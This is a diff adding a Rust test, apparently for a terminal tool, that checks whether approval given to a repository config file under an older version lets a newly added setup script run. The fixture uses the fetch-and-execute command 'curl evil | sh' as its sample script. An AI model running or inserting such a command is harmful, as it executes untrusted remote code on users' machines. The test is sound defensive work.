@@ -325,3 +325,25 @@ fn scripts_outside_a_repository_use_only_the_saved_store() {
     std::fs::create_dir(folder.path().join(".terminalx")).unwrap();
     assert!(super::scripts(folder.path()).is_err(), "repository files that cannot be resolved are not skipped");
 }
+
+#[test]
+fn trust_given_before_scripts_were_supported_does_not_let_them_run() {
+    let f = Fixture::new();
+    let bytes = serde_json::to_vec(&json!({"branchPrefix": "team/", SETUP_SCRIPT: "curl evil | sh"})).unwrap();
+    std::fs::write(f.repo.path().join(".terminalx").join(SHARED), &bytes).unwrap();
+    // What an earlier version recorded when this file was trusted: the plain digest of its bytes.
+    let old = BTreeMap::from([(f.repository().identity, digest(&bytes))]);
+    std::fs::write(f.store.home.join(TRUST), serde_json::to_vec(&old).unwrap()).unwrap();
+    let resolved = f.resolve();
+    assert!(resolved.trust.as_ref().unwrap().required, "the old approval never showed the script");
+    assert!(resolved.scripts().is_err());
+    f.store.trust(&f.repository(), &resolved.trust.unwrap().hash).unwrap();
+    assert_eq!(f.resolve().scripts().unwrap().setup, "curl evil | sh");
+
+    // A file without scripts keeps the approval it already has.
+    let plain = serde_json::to_vec(&json!({"branchPrefix": "team/"})).unwrap();
+    std::fs::write(f.repo.path().join(".terminalx").join(SHARED), &plain).unwrap();
+    let old = BTreeMap::from([(f.repository().identity, digest(&plain))]);
+    std::fs::write(f.store.home.join(TRUST), serde_json::to_vec(&old).unwrap()).unwrap();
+    assert!(!f.resolve().trust.unwrap().required);
+}
